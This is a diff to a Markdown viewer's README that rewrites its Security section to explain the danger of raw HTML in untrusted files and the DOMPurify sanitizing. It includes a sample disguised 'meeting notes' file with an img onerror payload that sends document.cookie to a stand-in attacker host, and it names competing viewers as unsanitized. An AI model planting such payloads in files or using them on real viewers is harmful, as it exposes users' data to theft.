@@ -98,18 +98,47 @@ tree of notes and always get rendered pages.
 
 ## Security
 
-**Untrusted Markdown is safe to open.** This matters more than it sounds: Markdown
-is allowed to contain raw HTML, and once mdbrowse is your `.md` handler, a
-double-click on a downloaded file renders it on a `file://` origin. `innerHTML`
-won't run a `<script>` tag — but it *will* fire event handlers, so a plain
-`<img src=x onerror=...>` in a `.md` is enough to execute attacker JavaScript
-next to your local files.
+**Untrusted Markdown is safe to open.** This matters more than it sounds. Markdown is
+allowed to contain raw HTML, and once mdbrowse is your `.md` handler, a double-click on
+a downloaded file renders it on a `file://` origin — next to your own files. `innerHTML`
+won't run a `<script>` tag, but it *will* fire event handlers, so a single `<img>` line
+is enough to execute someone else's JavaScript.
 
-mdbrowse therefore runs everything through **DOMPurify** before it touches the DOM.
-A `.md` from a stranger cannot run scripts, phone home, or poke at your files.
+Here is a document that looks like meeting notes:
 
-Found a way around that? [`SECURITY.md`](SECURITY.md) says what counts, what doesn't,
-and how to report it privately.
+```markdown
+# Meeting notes
+
+Thanks for yesterday! A couple of points we covered:
+
+- deadline moved to Friday
+- budget approved
+
+<img src="logo.png" onerror="fetch('https://evil.example/steal?f='+document.cookie)">
+```
+
+Skim it and you see notes with a company logo. But `logo.png` does not exist, so the
+`onerror` runs every time — and it can do anything: here it ships your data off to
+someone else's server. You never clicked anything except "open the file".
+
+**This is not hypothetical for the alternatives.** Both pass raw HTML straight through:
+[mdview](https://github.com/mapitman/mdview) does it deliberately (`html.WithUnsafe()`
+in `main.go`) and it *also* registers as your `.md` handler; mdopen renders with no
+sanitizer either. Open that file in one of them and the `fetch` fires.
+
+mdbrowse runs everything through **DOMPurify** before it touches the DOM, so what
+actually reaches the page is:
+
+```html
+<img src="logo.png">        <!-- the onerror attribute is gone entirely -->
+```
+
+No script runs. Verified against a hostile document in a real headless browser, not
+just on paper — `onerror`, `<iframe>`, `javascript:` URLs and SVG `onload` are all
+stripped, and the rest of the document survives intact.
+
+Found a way around it? [`SECURITY.md`](SECURITY.md) says what counts, what doesn't, and
+how to report it privately.
 
 ## Install
 
